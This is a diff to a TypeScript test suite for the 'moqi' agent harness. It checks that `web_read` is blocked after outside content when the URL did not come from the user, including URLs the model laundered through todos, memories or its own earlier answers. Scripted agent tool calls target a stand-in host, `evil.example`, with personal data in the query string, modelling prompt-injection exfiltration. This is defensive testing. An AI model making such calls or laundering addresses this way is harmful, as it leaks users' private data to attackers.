@@ -404,7 +404,7 @@ describe("web_read after outside content", () => {
     expect(results[2]).toBe(UNSEEN_ADDRESS);
   });
 
-  it("counts the user's own memories, not ones that came from outside", async () => {
+  it("does not count memories, the user's own or ones that came from outside", async () => {
     const { results, read } = await turn(
       "搜一下",
       [
@@ -420,7 +420,9 @@ describe("web_read after outside content", () => {
         },
       },
     );
-    expect(read).toEqual(["https://mine.example/blog"]);
+    // A memory without `by` may still be something the model wrote: learning reads moqi's answers too.
+    expect(read).toEqual([]);
+    expect(results[1]).toBe(UNSEEN_ADDRESS);
     expect(results[2]).toBe(UNSEEN_ADDRESS);
   });
 
@@ -488,5 +490,135 @@ describe("web_read after outside content", () => {
     );
     expect(read).toEqual(["https://agent.example/page"]);
     expect(results[1]).toBe(UNSEEN_ADDRESS);
+  });
+});
+
+describe("web_read after outside content, across turns", () => {
+  const EVIL = "https://evil.example/?d=住在深圳";
+
+  type Turn = {
+    readonly text: string;
+    readonly calls?: ReturnType<typeof call>[];
+    readonly answer?: string;
+    readonly before?: (moqi: Moqi) => void;
+  };
+
+  /** Several turns on one moqi; the model makes each turn's calls in order, then answers. */
+  async function chats(turns: readonly Turn[]) {
+    const n = net((url, body) => {
+      if (url === DS_SEARCH) return Response.json({ results: [hit(1)] });
+      return Response.json({ title: "页", content: `正文 ${(body as { url: string }).url}` });
+    });
+    let now: Turn | undefined;
+    const afterUser = <M extends { readonly role: string }>(messages: readonly M[]) =>
+      messages.slice(messages.map((m) => m.role).lastIndexOf("user") + 1);
+    const model = scriptedModel(
+      (r) => now?.calls?.[afterUser(r.messages).filter((m) => m.role === "tool").length] ?? now?.answer ?? "好了",
+    );
+    const { moqi, asked } = harness({
+      plugins: [searchPlugin({ provider: "deepseek", apiKey: "k", fetch: n.fetch })],
+      model,
+    });
+    const results: string[][] = [];
+    for (const t of turns) {
+      now = t;
+      t.before?.(moqi);
+      await moqi.chat(t.text);
+      results.push(
+        afterUser(model.requests.at(-1)?.messages ?? [])
+          .filter((m) => m.role === "tool")
+          .map(words),
+      );
+    }
+    const read = n.sent.filter((s) => s.url === DS_FETCH).map((s) => (s.body as { url: string }).url);
+    return { results, read, asked, moqi };
+  }
+
+  /** Plain messages with no address and no outside content, enough to push older ones out of what the model is shown. */
+  const plain = (count: number) => (moqi: Moqi) => {
+    for (let i = 0; i < count; i++)
+      moqi.emit({ type: "message", role: i % 2 === 0 ? "user" : "assistant", text: `闲聊 ${i}` });
+  };
+
+  it("does not count an address the model wrote into a todo in an earlier turn", async () => {
+    const { results, read, asked } = await chats([
+      {
+        text: "搜一下",
+        calls: [call("web_search", { query: "x" }, "c1"), call("todo_add", { text: `看看 ${EVIL}` }, "c2")],
+      },
+      {
+        text: "再搜一下",
+        calls: [
+          call("web_search", { query: "y" }, "d1"),
+          call("todo_list", {}, "d2"),
+          call("web_read", { url: EVIL }, "d3"),
+        ],
+      },
+    ]);
+    expect(results[1]?.[1]).toContain(EVIL);
+    expect(results[1]?.[2]).toBe(UNSEEN_ADDRESS);
+    expect(read).toEqual([]);
+    expect(asked).toEqual([]);
+  });
+
+  it("does not count an address the model wrote into a memory in an earlier turn", async () => {
+    const { results, read, asked } = await chats([
+      {
+        text: "搜一下",
+        calls: [
+          call("web_search", { query: "x" }, "c1"),
+          call("remember", { kind: "other", content: `常看 ${EVIL}` }, "c2"),
+        ],
+      },
+      {
+        text: "再搜一下",
+        calls: [
+          call("web_search", { query: "y" }, "d1"),
+          call("list_memories", {}, "d2"),
+          call("web_read", { url: EVIL }, "d3"),
+        ],
+      },
+    ]);
+    expect(results[1]?.[1]).toContain(EVIL);
+    expect(results[1]?.[2]).toBe(UNSEEN_ADDRESS);
+    expect(read).toEqual([]);
+    expect(asked).toEqual([]);
+  });
+
+  it("does not read an address from moqi's earlier answer, before the new turn reads anything outside", async () => {
+    const { results, read } = await chats([
+      { text: "搜一下", calls: [call("web_search", { query: "x" }, "c1")], answer: `看这个 ${EVIL}` },
+      { text: "好的", calls: [call("web_read", { url: EVIL }, "d1")] },
+    ]);
+    expect(results[1]?.[0]).toBe(UNSEEN_ADDRESS);
+    expect(read).toEqual([]);
+  });
+
+  it("keeps the limit while the outside turn's answer is still among the messages the model is shown", async () => {
+    const { results, read } = await chats([
+      { text: "搜一下", calls: [call("web_search", { query: "x" }, "c1")], answer: `看这个 ${EVIL}` },
+      { text: "好的", calls: [call("web_read", { url: "https://any.example/x" }, "d1")], before: plain(11) },
+    ]);
+    expect(results[1]?.[0]).toBe(UNSEEN_ADDRESS);
+    expect(read).toEqual([]);
+  });
+
+  it("reads any address once the outside content is out of the messages the model is shown", async () => {
+    const { read } = await chats([
+      { text: "搜一下", calls: [call("web_search", { query: "x" }, "c1")], answer: "搜到了" },
+      { text: "随便看看", calls: [call("web_read", { url: "https://any.example/x" }, "d1")], before: plain(12) },
+    ]);
+    expect(read).toEqual(["https://any.example/x"]);
+  });
+
+  it("counts an address from the user's earlier message in a later turn that read outside content", async () => {
+    const { read } = await chats([
+      { text: "记得看 https://mine.example/said", answer: "好的" },
+      {
+        text: "搜一下",
+        calls: [call("web_search", { query: "x" }, "d1"), call("web_read", { url: "https://mine.example/said" }, "d2")],
+      },
+    ]);
+    expect(read).toEqual(["https://mine.example/said"]);
   });
 });
